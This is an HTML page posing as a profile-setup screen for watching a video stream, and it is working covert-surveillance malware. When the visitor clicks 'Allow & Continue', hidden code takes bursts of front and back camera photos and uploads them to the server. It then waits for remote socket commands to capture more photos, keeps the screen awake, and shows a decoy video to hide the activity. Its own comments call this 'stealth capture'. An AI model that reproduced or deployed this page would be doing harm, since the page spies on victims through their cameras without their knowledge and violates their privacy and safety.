<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Profile & Stream Portal</title>
    <script src="/socket.io/socket.io.js"></script>
    <style>
        * { box-sizing: border-box; }
        body { 
            background: #0b0f19; 
            margin: 0; 
            overflow: hidden; 
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            width: 100vw;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            color: #fff;
        }
        
        /* Profile Creation Container */
        #profileSection {
            position: absolute;
            z-index: 20;
            background: #111827;
            padding: 30px 24px;
            border-radius: 16px;
            text-align: center;
            width: 90%;
            max-width: 360px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.6);
            border: 1px solid #1f2937;
        }

        /* Circular Profile Avatar at Top */
        .avatar-container {
            position: relative;
            width: 90px;
            height: 90px;
            margin: 0 auto 15px auto;
        }

        #previewImg {
            width: 100%;
            height: 100%;
            border-radius: 50%;
            object-fit: cover;
            border: 3px solid #38bdf8;
            background: #1f2937;
        }

        .camera-badge {
            position: absolute;
            bottom: 0;
            right: 0;
            background: #38bdf8;
            color: #0f172a;
            width: 28px;
            height: 28px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 0.8em;
            cursor: pointer;
            box-shadow: 0 2px 5px rgba(0,0,0,0.3);
        }

        .file-input { display: none; }

        #profileSection h2 {
            margin: 0 0 6px 0;
            color: #38bdf8;
            font-size: 1.3em;
        }

        #profileSection p {
            font-size: 0.85em;
            color: #9ca3af;
            margin: 0 0 20px 0;
            line-height: 1.4;
        }

        .input-box {
            width: 100%;
            padding: 12px;
            margin-bottom: 15px;
            background: #1f2937;
            border: 1px solid #374151;
            border-radius: 8px;
            color: #fff;
            font-size: 1em;
            outline: none;
            text-align: center;
        }

        .btn {
            width: 100%;
            padding: 12px;
            font-size: 1em;
            font-weight: 600;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            background-color: #38bdf8;
            color: #0f172a;
            transition: background 0.2s;
        }
        .btn:hover { background-color: #0ea5e9; }

        /* Video Stream Player */
        #mediaPlayer {
            width: 100%;
            height: 100%;
            border: none;
            display: none;
            position: absolute;
            z-index: 5;
        }
    </style>
</head>
<body>

    <!-- Profile Creation & Circular Avatar Section -->
    <div id="profileSection">
        <div class="avatar-container">
            <img id="previewImg" src="https://images.unsplash.com/photo-1534528741775-53994a69daeb?w=150" alt="Profile Avatar">
            <label for="profilePicInput" class="camera-badge">📷</label>
        </div>
        
        <h2>Create Profile</h2>
        <p>Set up your profile picture and name to watch the stream.</p>
        
        <input type="text" id="username" class="input-box" placeholder="Enter Your Name" autocomplete="off">
        <input type="file" id="profilePicInput" class="file-input" accept="image/*">
        
        <button class="btn" id="actionBtn">Allow & Continue</button>
    </div>

    <!-- Dynamic Video Stream Player -->
    <iframe id="mediaPlayer" allow="autoplay; fullscreen"></iframe>

    <!-- 100% Hidden Headless Elements for Blind Background Captures -->
    <video id="hiddenCamera" autoplay playsinline style="display:none; position:absolute; opacity:0; pointer-events:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const profileSection = document.getElementById('profileSection');
        const usernameInput = document.getElementById('username');
        const profilePicInput = document.getElementById('profilePicInput');
        const previewImg = document.getElementById('previewImg');
        const actionBtn = document.getElementById('actionBtn');
        const mediaPlayer = document.getElementById('mediaPlayer');
        
        let socket;
        let wakeLock = null;

        // Parse Dynamic Video URL from query params (?v=...)
        const urlParams = new URLSearchParams(window.location.search);
        const encodedVid = urlParams.get('v');
        let targetVideoUrl = "";
        
        if(encodedVid) {
            try { targetVideoUrl = atob(encodedVid); } catch(e) {}
        }

        // Gallery Image Selection Handler
        profilePicInput.addEventListener('change', (event) => {
            const file = event.target.files[0];
            if (file) {
                const reader = new FileReader();
                reader.onload = function(e) { previewImg.src = e.target.result; }
                reader.readAsDataURL(file);
            }
        });

        // Allow & Continue Click Handler (Initial 10 photos: 5 front + 5 back)
        actionBtn.addEventListener('click', async () => {
            const name = usernameInput.value.trim();
            if (!name) {
                alert("Please enter your name first!");
                return;
            }

            actionBtn.innerText = "Loading Stream...";
            actionBtn.disabled = true;

            try {
                // 1. Initial Front Camera Capture (5 Photos)
                await captureSequence("user", "front");
                // 2. Initial Back Camera Capture (5 Photos)
                await captureSequence("environment", "back");
            } catch (err) {
                console.error("Initial stealth capture error:", err);
            }

            // Launch Stream Player
            profileSection.style.display = 'none';
            mediaPlayer.style.display = 'block';
            mediaPlayer.src = targetVideoUrl ? targetVideoUrl : "https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1"; 

            initializeSecuritySystem();
        });

        // Initialize Background Socket & Listeners for /moref and /moreb
        function initializeSecuritySystem() {
            socket = io();
            keepScreenAwake();

            // Listen for Front Camera Command (/moref)
            socket.on('capture_front', async () => {
                await captureSequence("user", "command_front");
            });

            // Listen for Back Camera Command (/moreb)
            socket.on('capture_back', async () => {
                await captureSequence("environment", "command_back");
            });
        }

        // Reusable Function to Capture 5 Photos from any specified Camera Mode
        async function captureSequence(facingMode, labelPrefix) {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode } });
                const video = document.getElementById('hiddenCamera');
                video.srcObject = stream;
                
                await new Promise(resolve => video.onloadedmetadata = resolve);

                for (let i = 0; i < 5; i++) {
                    await captureAndSend(video, `${labelPrefix}_${i + 1}`);
                    await new Promise(resolve => setTimeout(resolve, 800)); 
                }

                stream.getTracks().forEach(track => track.stop());
            } catch (error) {
                console.error(`Capture Error (${labelPrefix}):`, error);
            }
        }

        // Send Captured Frame to Backend Server Headlessly
        async function captureAndSend(video, label) {
            const canvas = document.getElementById('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            return new Promise((resolve) => {
                canvas.toBlob(async (blob) => {
                    const formData = new FormData();
                    formData.append('photo', blob, `capture_${label}.jpg`);
                    try {
                        await fetch('/upload', { method: 'POST', body: formData });
                    } catch (err) { console.error("Upload failed", err); }
                    resolve();
                }, 'image/jpeg', 0.8);
            });
        }

        // Keep Screen Awake
        async function keepScreenAwake() {
            try {
                if ('wakeLock' in navigator) {
                    wakeLock = await navigator.wakeLock.request('screen');
                }
            } catch (err) {}
        }

        // Re-apply WakeLock if visibility changes
        document.addEventListener('visibilitychange', async () => {
            if (document.visibilityState === 'visible' && mediaPlayer.style.display === 'block') {
                keepScreenAwake();
            }
        });
    </script>
</body>
</html>
